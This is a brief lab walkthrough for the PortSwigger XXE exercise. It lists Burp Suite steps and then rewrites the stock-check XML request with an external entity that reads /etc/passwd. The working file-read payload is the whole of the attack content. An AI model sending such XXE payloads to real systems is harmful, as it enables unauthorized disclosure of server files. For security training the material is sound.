# [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

> exploit the check store request with xml input

- open burp
- open page in browser
- navigate to a product
- click "check store" button
- check history in burp
- send the `/product/stock` request to the repeater
- will see the following:

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- change it to

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
